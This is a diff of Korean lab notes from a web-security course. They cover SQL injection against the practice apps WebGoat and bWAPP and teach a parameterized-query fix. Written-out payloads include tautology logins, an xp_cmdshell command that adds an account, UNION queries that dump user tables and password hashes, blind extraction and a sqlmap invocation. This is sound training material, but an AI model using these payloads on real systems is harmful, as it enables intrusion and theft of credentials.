@@ -1102,101 +1102,210 @@ root@kali:~#
    * 정상적인 요청
      * search.jsp?text=abcd ⇒ select * from data where keyword = 'abcd'
        비정상적인 요청 유형 ⇒ SQL Injection 공격 유형
-     
    * #1. 항상 참이 되는 입력 ⇒ 모든 내용이 반환 = 권한 밖의 데이터에 대해 접근이 가능
      ⇒ search.jsp?text=abcd' or 'a' = 'a ⇒ select * from data where keyword = 'abcd' or 'a' = 'a'
      ⇒ data 테이블에 모든 데이터를 조회해서 반환
-     
-   * #2 오류를 유발하는 입력 ⇒ 추가 공격을 위한 정보 수입
-     ⇒ search.jsp?text=abcd'
-     ⇒ select * from data where keyword = 'abcd''
-     ⇒ 홑따움표의 개수가 일치하지 않아서 오류가 발생
-     ⇒ 오류 메시지에 대한 처리가 불완전하여 시스템 내부 정보가 사용자 화면에 출력 될 수 있음
-     
-   * LAB@WinXP > Paros 실행 후 IE 브라우저로 WebGoat 사이트로 접속 ⇒ http://192.168.49.1:8080/WebGoat (webgoat / webgoat) > Injection Flaws > String SQL Injection 메뉴로 이동
-     (사용자 계좌(계정)의 유효성을 체크해 주는 서비스)
-     ![img](https://lh6.googleusercontent.com/8edG_W5s2q74ekLOfdlJMYsyPYh75m7KWn3R-eq93x2AJlfRQRqPHUXF5gT8kmjiLrbbf276c0vI7qkI1M6d_M-RgtZbm9htQDR7rlVjAJsI9GlqZLOJtu1Cd_T6LVG21P-T9wsh)
-   
-     
-   
-   * 선택한 지역의 날씨 정보를 출력해주는 서비스.
-     WebGoat > Injection Flaws > Numeric SQL Inejction
-   
-     ![img](https://lh4.googleusercontent.com/YvLPx-EdsSvhNPLrT2d1XjhokTG-AlFO0RM9QVTqY2uGBoTKi44ed06lm6kQrdtudr3lSwob2hxIzUM55zvbu_ebcXBNoZ8PwZbuyLK9NecsX4AaDS_ln_h4TdBgItNwwP4QgeSP)
-   
-     * Q. 모든 지역의 날씨 정보가 출력되도록 하시오.
-   
-     * 과정
-       [화면]지역을 선택: Seattle → station 파라미터의 값 102으로 지정
-       [전달].../search.jsp?satation=102
-       [처리]select * from weather where satation = 102
-   
-     * 정답1.
-       URL 주소의 요청 파라미터를 수정해서 직접 호출하는 방법http://192.168.49.1:8080/WebGoat/attack?Screen=75&menu=1100&station=102 or 1=1
-   
-     * 정답2.
-       Proxy를 이용해서 요청 파라미터를 수정해서 호출하는 방법station=102 or 1=1&SUBMIT=Go%21
-       ![img](https://lh5.googleusercontent.com/JQHUMD9_uKFaArd2yNkHYgwbM-Z98IaJiU3EYEmT1ob5JO1pmdvZkGSaXAFDlj1o_FVlvgpvhMHTYmCHhJyci-B-6QkfS7n8Q_psXnuon8cJpO4P1QD4TYXrMre3LeKFvQLbEMvB)
-   
-       #2 오류를 유발하는 입력
-       ⇒ 추가 공격을 위한 정보 수입
-       ⇒ search.jsp?text=abcd'⇒ select * from data where keyword = 'abcd''
-       → 홑따움표의 개수가 일치하지 않아서 오류가 발생
-       → 오류 메시지에 대한 처리가 불완전하여 시스템 내부 정보가 사용자 화면에 출력 될 수 있음
-   
-     * 정답3. 브라우저의 개발자 도구를 이용해서 파라미터의 값을 변경하여 서버로 전달
-   
-   * Stage2.
-     ![img](https://lh5.googleusercontent.com/JQHUMD9_uKFaArd2yNkHYgwbM-Z98IaJiU3EYEmT1ob5JO1pmdvZkGSaXAFDlj1o_FVlvgpvhMHTYmCHhJyci-B-6QkfS7n8Q_psXnuon8cJpO4P1QD4TYXrMre3LeKFvQLbEMvB)
-     WebGoat > Injection Flaws > LAB: SQL Injection > Stage 1. String SQL Injection ![img](https://lh5.googleusercontent.com/-dsoFpWODlIQSPcr4_Vv8R678hbWxMB9ka9d1A0DyBsC-f06YaLdiaIJ-vGWeNSTNh3BHrHl3AUYVaXlkAlhXQLEveeV6HywM47bxeoj8vskAEZcTdXb2LLY9htFNpqLU8zNiIci)문제: Neville 사용자로 로그인 하시오.
-   
-     [화면]사용자 : Neville ⇒ employee_id 파라미터의 값으로 112가 선택패스워드 : a' or 'a' = 'a
-   
-     [전달] .../login.jsp?userid=112&password=a' or 'a' = 'a
-     [처리] select * from users where userid = 112 and password = 'a' or 'a' = 'a'
-     → 조회 결과가 있으면 → 로그인 성공
-     → 조회 결과가 없으면 → 로그인 실패
-     브라우저의 개발자 도구를 이용해서 클라이언트의 입력 값 제약 조건을 해제 후 공격 문자열을 입력, 전달한다.![img](https://lh5.googleusercontent.com/K-P0VWiGLX53U75I5rx8bqtr5uNL-cSQkWRlQb2Dpwfs5ucIMWGHbcIITvbXvQcEbpVa18H0KVpcjiAObUi5y3_jagdILsk-G41jL8pXGdnuNrOPOuJ4eSUAw_CySCNMU2nPYvY6)
-     Proxy 도구를 이용해서 서버로 전달되는 중간에 값을 변경해서 전달하는 방법이 있다.![img](https://lh4.googleusercontent.com/scpuMyF2KObAhLl6HEDBXJ-PaQHIIQ7EQ6mmvosKI1OzctDfecOUSqjpCdNKqeTacv36l4izZNh2hJeUNx2GZJt1FHBv9j0sbSg7h_VdQ7UTjX_ZxQw-F65RUvrt3eiJNRjl7Z_g)
-   
-     
-   
-     Parameterized Query #1
-     문제 : State 1에서 사용된 소스의 문제점을 확인 후 안전한 방법으로 소스 코드를 수정 하시오
-   
-     ```java
-     // **진단 결과**
-     			// 외부 입력값 userID와 password를 검증하지 않고, SQL문 생성 및 실행에 사용하고 있다. => SQL Injection 취약!
-     			// 안전한 코드로 변경하는 방법
-     			// SQL문 쿼리문의 구조를 정의하고, 정의된 형태로만 실행되는 것을 보장 = 파라미터화된 쿼리 실행 = 구조화된 쿼리 실행
-     			// = PreparedStatement(미리 정의된) 객체를 이용해서 쿼리 실행
-     //			String query = "SELECT * FROM employee WHERE userid = " + userId + " and password = '" + password + "'";
-     //			// System.out.println("Query:" + query);
-     			
-     			// ###1 쿼리문의 구졸르 정의
-     			// 변수(입력값이 들어가는) 부분을 물음표(?)로 마킹한다.
-     			// 유의사항: 해당 컬럼의 데이터 타입을 고려하지 않는다.
-     				String query = "SELECT * FROM employee WHERE userid = ? and password = ?";
-     
-     				try
-     	 			{
-     					// ###2 Statement 객체를 PreparedStatement 객체로 변경.
-     					// PreparedStatement 객체를 생성.
-     					// prepareStatement() 메소드를 이용해서 생성하고, 파라미터로 궈리문의 구조를 전달한다.
-     					
-     					java.sql.PreparedStatement answer_statement = WebSession.getConnection(s)
-     							.prepareStatement(query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
-     					
-     					// ###3 변수에 값으 ㄹ바인딩 후 쿼리를 실행한다.
-     					// 해당 컬럼의 데이터 타입을 고려해서 바인딩 함수를 사용한다.
-     					answer_statement.setInt(1, Integer.parseInt(userId));	// 문자를 숫자로 캐스킹 해준다.
-     					answer_statement.setString(2, password);
-     					// answer_statement를 생성할 때 Query문을 정의해줬기 때문에 아래에 query는 이제 필요없다.
-     					// ResultSet answer_results = answer_statement.executeQuery(query);
-     					ResultSet answer_results = answer_statement.executeQuery();
-     ```
-   
-     
+
+### String SQL Injection
+
+* #2 오류를 유발하는 입력 ⇒ 추가 공격을 위한 정보 수입
+  ⇒ search.jsp?text=abcd'
+  ⇒ select * from data where keyword = 'abcd''
+  ⇒ 홑따움표의 개수가 일치하지 않아서 오류가 발생
+  ⇒ 오류 메시지에 대한 처리가 불완전하여 시스템 내부 정보가 사용자 화면에 출력 될 수 있음
+  * LAB@WinXP > Paros 실행 후 IE 브라우저로 WebGoat 사이트로 접속 ⇒ http://192.168.49.1:8080/WebGoat (webgoat / webgoat) > Injection Flaws > String SQL Injection 메뉴로 이동
+    (사용자 계좌(계정)의 유효성을 체크해 주는 서비스)
+    ![img](https://lh6.googleusercontent.com/8edG_W5s2q74ekLOfdlJMYsyPYh75m7KWn3R-eq93x2AJlfRQRqPHUXF5gT8kmjiLrbbf276c0vI7qkI1M6d_M-RgtZbm9htQDR7rlVjAJsI9GlqZLOJtu1Cd_T6LVG21P-T9wsh)
+
+### Numeric SQL Inejction
+
+* 선택한 지역의 날씨 정보를 출력해주는 서비스.
+  WebGoat > Injection Flaws > Numeric SQL Inejction
+
+![img](https://lh4.googleusercontent.com/YvLPx-EdsSvhNPLrT2d1XjhokTG-AlFO0RM9QVTqY2uGBoTKi44ed06lm6kQrdtudr3lSwob2hxIzUM55zvbu_ebcXBNoZ8PwZbuyLK9NecsX4AaDS_ln_h4TdBgItNwwP4QgeSP)
+
+* Q. 모든 지역의 날씨 정보가 출력되도록 하시오.
+
+* 과정
+  [화면]지역을 선택: Seattle → station 파라미터의 값 102으로 지정
+  [전달].../search.jsp?satation=102
+  [처리]select * from weather where satation = 102
+
+* 정답1.
+  URL 주소의 요청 파라미터를 수정해서 직접 호출하는 방법http://192.168.49.1:8080/WebGoat/attack?Screen=75&menu=1100&station=102 or 1=1
+
+* 정답2.
+  Proxy를 이용해서 요청 파라미터를 수정해서 호출하는 방법station=102 or 1=1&SUBMIT=Go%21
+  ![img](https://lh5.googleusercontent.com/JQHUMD9_uKFaArd2yNkHYgwbM-Z98IaJiU3EYEmT1ob5JO1pmdvZkGSaXAFDlj1o_FVlvgpvhMHTYmCHhJyci-B-6QkfS7n8Q_psXnuon8cJpO4P1QD4TYXrMre3LeKFvQLbEMvB)
+
+  
+
+* 정답3. 브라우저의 개발자 도구를 이용해서 파라미터의 값을 변경하여 서버로 전달
+
+* Stage2.
+  ![img](https://lh5.googleusercontent.com/JQHUMD9_uKFaArd2yNkHYgwbM-Z98IaJiU3EYEmT1ob5JO1pmdvZkGSaXAFDlj1o_FVlvgpvhMHTYmCHhJyci-B-6QkfS7n8Q_psXnuon8cJpO4P1QD4TYXrMre3LeKFvQLbEMvB)
+  WebGoat > Injection Flaws > LAB: SQL Injection > Stage 1. String SQL Injection ![img](https://lh5.googleusercontent.com/-dsoFpWODlIQSPcr4_Vv8R678hbWxMB9ka9d1A0DyBsC-f06YaLdiaIJ-vGWeNSTNh3BHrHl3AUYVaXlkAlhXQLEveeV6HywM47bxeoj8vskAEZcTdXb2LLY9htFNpqLU8zNiIci)문제: Neville 사용자로 로그인 하시오.
+
+  [화면]사용자 : Neville ⇒ employee_id 파라미터의 값으로 112가 선택패스워드 : a' or 'a' = 'a
+
+  [전달] .../login.jsp?userid=112&password=a' or 'a' = 'a
+  [처리] select * from users where userid = 112 and password = 'a' or 'a' = 'a'
+  → 조회 결과가 있으면 → 로그인 성공
+  → 조회 결과가 없으면 → 로그인 실패
+  브라우저의 개발자 도구를 이용해서 클라이언트의 입력 값 제약 조건을 해제 후 공격 문자열을 입력, 전달한다.![img](https://lh5.googleusercontent.com/K-P0VWiGLX53U75I5rx8bqtr5uNL-cSQkWRlQb2Dpwfs5ucIMWGHbcIITvbXvQcEbpVa18H0KVpcjiAObUi5y3_jagdILsk-G41jL8pXGdnuNrOPOuJ4eSUAw_CySCNMU2nPYvY6)
+  Proxy 도구를 이용해서 서버로 전달되는 중간에 값을 변경해서 전달하는 방법이 있다.![img](https://lh4.googleusercontent.com/scpuMyF2KObAhLl6HEDBXJ-PaQHIIQ7EQ6mmvosKI1OzctDfecOUSqjpCdNKqeTacv36l4izZNh2hJeUNx2GZJt1FHBv9j0sbSg7h_VdQ7UTjX_ZxQw-F65RUvrt3eiJNRjl7Z_g)
+
+### Parameterized 이용하여 Query문 Injection 방지
+
+Parameterized Query #1
+문제 : State 1에서 사용된 소스의 문제점을 확인 후 안전한 방법으로 소스 코드를 수정 하시오
+
+```java
+// **진단 결과**
+			// 외부 입력값 userID와 password를 검증하지 않고, SQL문 생성 및 실행에 사용하고 있다. => SQL Injection 취약!
+			// 안전한 코드로 변경하는 방법
+			// SQL문 쿼리문의 구조를 정의하고, 정의된 형태로만 실행되는 것을 보장 = 파라미터화된 쿼리 실행 = 구조화된 쿼리 실행
+			// = PreparedStatement(미리 정의된) 객체를 이용해서 쿼리 실행
+//			String query = "SELECT * FROM employee WHERE userid = " + userId + " and password = '" + password + "'";
+//			// System.out.println("Query:" + query);
+			
+			// ###1 쿼리문의 구졸르 정의
+			// 변수(입력값이 들어가는) 부분을 물음표(?)로 마킹한다.
+			// 유의사항: 해당 컬럼의 데이터 타입을 고려하지 않는다.
+				String query = "SELECT * FROM employee WHERE userid = ? and password = ?";
+
+				try
+	 			{
+					// ###2 Statement 객체를 PreparedStatement 객체로 변경.
+					// PreparedStatement 객체를 생성.
+					// prepareStatement() 메소드를 이용해서 생성하고, 파라미터로 궈리문의 구조를 전달한다.
+					
+					java.sql.PreparedStatement answer_statement = WebSession.getConnection(s)
+							.prepareStatement(query, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);
+					
+					// ###3 변수에 값으 ㄹ바인딩 후 쿼리를 실행한다.
+					// 해당 컬럼의 데이터 타입을 고려해서 바인딩 함수를 사용한다.
+					answer_statement.setInt(1, Integer.parseInt(userId));	// 문자를 숫자로 캐스킹 해준다.
+					answer_statement.setString(2, password);
+					// answer_statement를 생성할 때 Query문을 정의해줬기 때문에 아래에 query는 이제 필요없다.
+					// ResultSet answer_results = answer_statement.executeQuery(query);
+					ResultSet answer_results = answer_statement.executeQuery();
+```
+
+* #3. Stored Procedure를 호출하는 입력 ⇒ DB 서버의 제어권 탈취에 사용할 수 있다.
+  ⇒ search.jsp?text=abcd'; exec xp_cmdshell 'net user hack hack /add'; --
+  ⇒ select * from data where keyword = 'abcd'; exec xp_cmdshell 'net user hack hack /add'; --'
+
+* #4. UNION 구문을 이용한 SQL Injection ⇒
+
+  * UNION 할 테이블의 컬럼 개수가 같아야 한다.
+
+  * 데이터 타입이 호환 가능해야 한다. → 값을 대입할 컬럼의 데이터 타입을 알아야 한다.
+
+  * 공격자가 작성한 쿼리 구문을 통해 (내부 테이블의) 데이터가 유출 
+
+  * UNION 구문 설명 ⇒ [https://zetawiki.com/wiki/SQL_UNION,_UNION_ALL_%EC%97%B0%EC%82%B0%EC%9E%90](https://zetawiki.com/wiki/SQL_UNION,_UNION_ALL_연산자)
+    우편번호 조회 서비스
+    http://70.12.50.56:9090/zipcode.asp?dong=하대동⇒ select * from address where dong = '하대동'
+    우편번호 조회 서비스 결과에 공격자가 원하는 정보가 함께 출력되도록 입력값 조작
+    select * from address where dong = '하대동' UNION select * from user --'
+    ⇒ http://70.12.50.56:9090/zipcode.asp?dong=하대동' UNION select * from user --
+
+    UNION 구문을 사용하기 위한 전제 조건컬럼의 개수와 데이터 타입이 동일해야 한다.
+    ⇒ 정상 쿼리(우편번호 조회 쿼리) 실행을 통해서 반환되는 컬럼의 개수와 각 컬럼의 데이터 타입을 확인해야 한다.공격자가 원하는 정보를 포함하고 있는 테이블과 컬럼의 이름을 알고 있어야 한다.
+    ⇒ 외부에서 (또는 검색을 통해서) 확인 가능한 DBMS의 시스템 테이블을 우선적으로 사용해야 한다.
+    LAB 우편번호 조회 서비스를 이용해서 해당 사이트([http://70.12.50.56:9090](http://70.12.50.56:9090/zipcode.asp))의 계정을 탈취해서 로그인해 보세요.
+
+    * #1 우편번호 조회 서비스를 통해서 반환하는 컬럼의 개수를 확인select * from address where dong = 'a' order by 1 --'
+      ⇒ .../zip_code.asp?dong=a' order by 1 --
+      ⇒ .../zip_code.asp?dong=a' order by 8 --
+      Microsoft OLE DB Provider for SQL Server 오류 '80040e14'ORDER BY 위치 번호 8이(가) SELECT 목록의 항목 번호 범위를 벗어났습니다.
+      /zip_search.asp, 줄 21→ 우편번호 조회 서비스를 위한 쿼리는 7개의 컬럼을 반환한다.
+      ⇒ **Error-Based SQL Injection**
+    * #2 UNION 구문을 이용해서 숫자로 구성된 7개의 값을 출력select * from address where dong = 'a' and 1=2 UNION select 1,2,3,4,5,6,7 --'
+      ⇒ .../zip_code.asp?dong=a' and 1=2 UNION select 1,2,3,4,5,6,7 --
+      Microsoft OLE DB Provider for SQL Server 오류 '80040e07'varchar 값 '110-753'을(를) 데이터 형식 int(으)로 변환하지 못했습니다.
+      /zip_search.asp, 줄 21
+    * #3 UNION 구문을 이용해서 해당 DBMS의 종류를 확인
+      select * from address where dong = 'a' and 1=2 UNION select 1,db_name(),@@version,4,5,6,7 --' 
+    * #4 MS-SQL의 시스템 테이블을 이용해서 해당 DB에서 사용하고 있는 사용자 테이블 목록을 조회
+      https://docs.microsoft.com/ko-kr/sql/relational-databases/system-tables/system-base-tables?view=sql-server-2017https://docs.microsoft.com/ko-kr/sql/relational-databases/system-compatibility-views/sys-sysobjects-transact-sql?view=sql-server-2017
+      select * from address where dong = 'a' and 1=2 UNION select 1,id,name,4,5,6,7 from sysobjects where xtype='U' --' 
+    * #5 member 테이블의 컬럼 정보(이름)를 조회
+      https://docs.microsoft.com/ko-kr/sql/relational-databases/system-compatibility-views/sys-syscolumns-transact-sql?view=sql-server-2017
+      select * from address where dong = 'a' and 1=2 UNION select 1,name,3,4,5,6,7 from syscolumns where id=2073058421 --' 
+      select * from address where dong = 'a' and 1=2 UNION select 1,name,3,4,5,6,7 from syscolumns where id=(select id from sysobjects where name='member') --' 
+    * #6 member 테이블에 정보를 조회select * from address where dong = 'a' and 1=2 UNION select 1,bId,bName,bPass,bMail,bPhone,7 from member --' 
+
+* #5 Blind SQL Injection
+
+  * 참, 거짓에 따라 서버의 반응이 다른 것을 이용한 공격기법
+  * WebGoat > Injection Flaws > Blind Numeric SQL Injection
+    * 입력한 계정 번호(account number)의 유효성 검증을 수행해주는 서비스
+      ![img](https://lh6.googleusercontent.com/9RHkyTjYvqvMKQ3OTMO8pDuJXGAIBwBdgh85otwd7vQ8BHShmh5s_TbSC3i6Cwz2LdoBkEEy0tDW4GPa8CX6J3nCdzKC82m5o21SbZFHRymgTUS4zlk1efMIAKgg51D4mfOGmQ7K)
+    * 서버 내부 처리를 예측
+      select * from account where account_no = 101
+      ⇒ 결과가 있으면 → Account number is valid.
+      ⇒ 결과가 없으면 → Invalid account number.
+    * select * from account where account_no = 101 and 1=1
+      ⇒ 결과가 있을 듯 → Account number is valid.
+    * select * from account where account_no = 101 and 1=2
+      ⇒ 결과가 없을 듯 → Invalid account number.
+    * 내가 찾고자 하는 쿼리문을 추가 했을 때 옳은지 옳지 않은지 확인해볼 수 있다.
+  * Q. pins 테이블에서 cc_number의 값이 1111222233334444인 pin 값을 구하시오
+    * select pin from pins where cc_number='1111222233334444'
+    * select * from account where account_no = 101 and (select pin from pins where cc_number='1111222233334444') = ???? (참인 값=2364)
+      ⇒ 참 → Account number is valid.
+      ⇒ 거짓 → Invalid account number.
+
+### Blind String SQL Injection
+
+* Q. WebGoat > Injection Flaws > Blind String SQL Injection
+  pins 테이블에서 cc_number의 값이 4321432143214321인 name 컬럼의 값을 구하시오.
+  * select * from accounts where account_no = 101 and (select substr(name,1,1) from pins where cc_number = '4321432143214321') = 'J'
+  * select * from accounts where account_no = 101 and (select substr(name,2,1) from pins where cc_number = '4321432143214321') = 'i'
+  * select * from accounts where account_no = 101 and (select substr(name,3,1) from pins where cc_number = '4321432143214321') = 'l'
+  * select * from accounts where account_no = 101 and (select name from pins where cc_number = '4321432143214321') = 'Jill'
+  * 숫자화 하여 범위 연삭
+    select * from accounts where account_no = 101 and (select ascii(name) from pins where cc_number = '4321432143214321') = 74
+
+### Union based SQL Injection
+
+* Q.  bWAPP 접속하여 admin 탈취 (Union based SQL Injection)
+  @Kali#2에서 브라우저 실행 후 http://Kali#1/bWAPP 로 접속 (bee / bug)![img](https://lh4.googleusercontent.com/3xzxgd72z-KJRAiXa8ITOtFJ67xjpHcrDy9tYoKqZCggprnfYIVwtOemziUAQ3TCY7m6rGWpTP-mHpXV4qqvYH9mM_S9Rue8w39vfWGSsgi7VgZRubAumt770sgxryZ60KO9pYaD)접속이 되지 않는 경우 @Kali#1에서 아래 명령어를 실행root@kali:~# service mysql startroot@kali:~# service apache2 start
+
+  Choose your bug: SQL Injection (GET/Search) 선택 후 Hack 버튼 클릭![img](https://lh3.googleusercontent.com/Jl2p_SjcGoKmPWlcnSgEaMoEJDoYlAFMpqjjG-W0cZvuhTGSwmUMMQMRq0V-ovRGUEE2_H5Un-v9oib0-_L3mxb-CUMNjTqg3mH1PLEsOZ2N3uU3S4Md0HbFOo9lKej6BM0Yw4JD)영화 정보를 제공하는 서비스
+
+  * man' 입력
+    ⇒ Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 ⇒ … where title like '%man'%' ⇐ SQL Injection
+  * #1 컬럼 개수 조회man' order by 1 #
+    :man' order by 8 #Error: Unknown column '8' in 'order clause' 
+    ⇒ 컬럼의 개수는 7개이다.
+  * #2 UNION 구문을 이용해서 숫자를 출력
+    man' and 1=2 union select 1,2,3,4,5,6,7 #
+    Title Release Character Genre IMDb2 3 5 4 Link ⇐ 2, 3, 4, 5번째 컬럼 정보만 사용자 화면에 출력된다.
+  * #3 UNION 구문을 이용해서 DB 정보를 조회
+    man' and 1=2 union select 1,2,**version()**,4,5,6,7 #
+  * #4 information_schema.tables 시스템 테이블을 이용해서 사용자 테이블을 조회
+    man' and 1=2 union select 1,**table_name**,3,4,5,6,7 from **information_schema.tables** #
+  * #5 users 테이블에 컬럼 정보를 조회 (information_schema.columns)man' and 1=2 union select 1,**column_name**,3,4,5,6,7 from **information_schema.columns where table_name = 'users'** #
+  * #6 users 테이블에서 id, login, password, secret, email 정보를 조회man' and 1=2 union select 1,**id, login, password, concat(secret,' : ',email)**, 6, 7 from **users** #![img](https://lh6.googleusercontent.com/dEhj6ar1lJqRt9Aa8nqkjEyeJWJspT_bsKVEWKeCDLgTDgAg5KK-awdXIMm2XkdPDuaFM6j1h_3zjHE87mF-p0r1tt7UresWNzhDzFrTu0nrGk1KXLVNP6oY7yesKGSRGQMpKocb)
+  * 암호화되어 있는 패스워드를 크래킹 = 6885858486f31043e5839c735d99457f045affd0
+    https://crackstation.net/
+
+
+
+@Kali#2에서 터미널을 실행
+
+sqlmap -u "취약한 웹 페이지 주소" --cookie "세션 쿠키 값" --dbms취약한 웹 페이지 주소
+
+⇒ http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search
+
+세션 쿠키 값 ⇒ PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0
+
+sqlmap -u
+
+"http://192.168.49.128/bWAPP/sqli_1.php?title=man&action=search" --cookie "PHPSESSID=nm1c5267j62bm755qh44kl2nc6; security_level=0" --dbs
 
 
 
